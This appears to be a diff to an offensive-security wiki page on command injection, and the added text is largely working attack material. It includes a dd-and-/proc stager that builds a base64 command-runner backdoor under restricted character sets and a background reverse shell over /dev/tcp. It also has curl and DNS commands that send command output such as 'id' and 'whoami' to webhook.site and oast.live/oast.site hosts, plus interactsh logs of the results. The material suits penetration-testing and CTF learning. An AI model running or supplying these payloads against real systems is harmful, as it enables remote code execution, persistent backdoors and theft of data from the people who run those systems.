@@ -37,15 +37,15 @@ $ sh shell.sh
 
 With very limited communication available, you can try a few things:
 
-```shell
-sleep 10  # Should wait 10 seconds if code is executed
-# DNS
+<pre class="language-shell"><code class="lang-shell"><strong>sleep 10  # Should wait 10 seconds if code is executed
+</strong># DNS
 interactsh-client -v  # Start as attacker (https://github.com/projectdiscovery/interactsh)
-nslookup nftca6lpouq.oast.live  # Any DNS request will trigger in tool
-bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.nftca6lpouq.oast.live/443'  # Exfiltrate command output
-# HTTP
-curl nftca6lpouq.oast.live
-```
+
+<strong>nslookup nftca6lpouq.oast.live  # Any DNS request will trigger in tool
+</strong><strong>bash -c 'echo 1 > /dev/tcp/`whoami`.`hostname`.nftca6lpouq.oast.live/443'  # Exfiltrate command output
+</strong># HTTP
+<strong>curl nftca6lpouq.oast.live
+</strong></code></pre>
 
 ### RCE in 4 bytes
 
@@ -186,6 +186,38 @@ for c in payload:
 ```
 {% endcode %}
 
+### Restricted charset + no HTTP/DNS (dd-shell)
+
+For very restricted scenarios where you are able to inject one command without any special characters, and you are not able to fetch a payload using curl or wget. The only required characters for this technique are: `[a-zA-Z0-9/= ]`. Only the slash, equals and space should be allowed, and this trick will allow you to run an arbitrarily complex payload on any Unix environment (even [docker/alpine](https://hub.docker.com/\_/alpine)).
+
+{% code title="Payload" %}
+```bash
+# Create 'base64 -d /tmp/2|sh' stager in /tmp/1
+dd if=/proc/self/cmdline of=base64 of=/tmp/1 bs=1 count=6 skip=28 seek=0         # 'base64'
+dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=7 seek=6                         # ' '
+dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=5 seek=7                         # '-'
+dd if=/proc/self/cmdline of=d of=/tmp/1 bs=1 count=2 skip=28 seek=8              # 'd'
+dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=7 seek=9                         # ' '
+dd if=/proc/self/cmdline of=/tmp/2 of=/tmp/1 bs=1 count=6 skip=28 seek=10        # '/tmp/2'
+dd if=/proc/net/dev of=/tmp/1 bs=1 count=1 skip=6 seek=16                        # '|'
+dd if=/proc/self/cmdline of=sh of=/tmp/1 bs=1 count=2 skip=28 seek=17            # 'sh'
+
+# Create encoded "echo 'echo $1|base64 -d|sh'>/tmp/s" writer in /tmp/2
+dd if=/proc/self/cmdline of=ZWNobyAnZWNobyAkMXxiYXNlNjQgLWR8c2gnPi90bXAvcw== of=/tmp/2 bs=1 count=48 skip=28 seek=0
+# Decode using 1st stager
+sh /tmp/1
+
+# Now run any encoded command with it (easily repeatable)
+sh /tmp/s aWQgPiAvdG1wL3B3bmVk  # 'id > /tmp/pwned'
+```
+{% endcode %}
+
+Note that all comments are only for clarification, and should be removed in your exploit.
+
+In this payload, we heavily abuse the `dd` command to read and write at specific locations. We also make use of the `/proc` filesystem, first by reading from `/proc/self/cmdline` to get the current command, in which we hide a string inside a duplicate `of=` parameter (eg. "base64"). We read 6 bytes into the `/tmp/1` file on which we build further. We also use the static `/proc/net/dev` file that always starts with the same table header, allowing us to write some special characters like `-`, `|` and   (not included in `cmdline`).&#x20;
+
+With this, we write a simple stager for `base64 -d /tmp/2|sh` so that we can write a longer payload inside of `/tmp/2`. We use this to write a backdoor inside `/tmp/s` that will execute any base64 argument it takes, and can be abused to get past the restricted charset.
+
 ## Background Shells
 
 When you have code execution, a problem you might find when connecting to a Reverse Shell is that it **exits** **after some time**, when the process is killed. This can be annoying as you only have a few seconds to execute commands interactively.&#x20;
@@ -197,6 +229,70 @@ Another way that might be preferable is running your Reverse Shell in a backgrou
 ```bash
 nohup bash -c 'sh -i >& /dev/tcp/127.0.0.1/1337 0>&1 &'
 ```
+
+## Data Exfiltration
+
+When executing commands, the main goal is to read its output to reach further into the system or to leak sensitive data. While it may sound simple, in some cases, this is made harder due to protections such as firewalling. You won't receive your reverse shell if a system prevents outgoing TCP connections to random ports like `:1337`. Therefore, we need to get a little more clever sometimes.&#x20;
+
+### HTTP(S)
+
+Some firewalls prevent random unknown ports but allow ports like 80 or 443 for HTTP and HTTPS traffic. Sometimes this is as simple as changing the port of your shell to either of these ports, but in other cases, the firewall will also check if a real HTTP request is being made.&#x20;
+
+To quickly test if HTTP(S) or DNS traffic is allowed, try using `interactsh-client` to quickly get a public subdomain where all interactions will be logged:
+
+{% embed url="https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#interactsh-client" %}
+
+{% code title="Start listener" %}
+```bash
+interactsh-client -v
+```
+{% endcode %}
+
+After confirming that, for example, HTTPS traffic is allowed, you can wrap your TCP connection over SSL which is indistinguishable from real HTTP traffic. For a clean shell, tools like [reverse\_ssh](https://github.com/NHAS/reverse\_ssh) implement this nicely with many extra features like alternative protocols.&#x20;
+
+For quick and dirty exfiltration via HTTP, services like [requestbin.com](https://requestbin.com/r) or [webhook.site](https://webhook.site/) offer a UI and a subdomain to make requests to, and you can quickly see all HTTP interactions with potentially exfiltrated data via the URL, or large data via the body:
+
+{% code title="Exfiltrate data (GET)" %}
+```bash
+curl -G "https://webhook.site/$GUID" --data-urlencode "output=$(id)"
+```
+{% endcode %}
+
+{% code title="Exfiltrate data (POST)" %}
+```bash
+curl "https://webhook.site/$GUID" -d "$(id)"
+```
+{% endcode %}
+
+### DNS
+
+Like before, [`interactsh-client`](https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#interactsh-client) can be used to confirm interaction with a wildcard subdomain. As it allows anything before the given subdomain, you can exfiltrate small amounts of data with it:
+
+{% code title="Exfiltrate data (DNS)" %}
+```bash
+< /dev/tcp/$(whoami).cosdh12q8guc0k2095k0ohqbeffp1drpg.oast.site/80
+```
+{% endcode %}
+
+This should result in a few DNS lookups with the target's username as the prefix:
+
+{% code title="interactsh-client log" %}
+```
+[INF] Listing 1 payload for OOB Testing
+[INF] cosdh12q8guc0k2095k0ohqbeffp1drpg.oast.site
+[uSEr.COSdH12q8GuC0K2095K0ohQbEFFp1dRPG] Received DNS interaction (A) from ...
+[USeR.CoSdh12q8gUc0k2095k0oHqbeFfp1drPG] Received DNS interaction (AAAA) from ...
+[user.cOsdh12q8GUc0K2095K0OHqbefFp1dRPg] Received DNS interaction (AAAA) from ...
+```
+{% endcode %}
+
+For a clean shell, there exist tools that implement the above and a better technique for downloading data using TXT records. It should be noted, however, that such a shell will be very slow and hard to use as this way of communicating is very unorthodox. [Poor man's Reverse DNS Shell](https://gist.github.com/FrankSpierings/4fe924866634a470bc46218d6d24a183#file-server-py)
+
+### Read from stored location
+
+The server you are exploiting is almost always directly accessible to you, so if it cannot connect to the outside, it must still be able to respond to your requests. We can abuse this by storing the output data at an accessible place like `/static/output.txt`, and then reading this data by accessing the path.&#x20;
+
+Another similar idea is doing the same for SQL data, imagine you have a blind SQL injection with stacked queries (you are able to INSERT/UPDATE). In this case, you can insert/update the data you want to exfiltrate to another place that you can read, like your users description or a comment.&#x20;
 
 ## Privilege Escalation
 
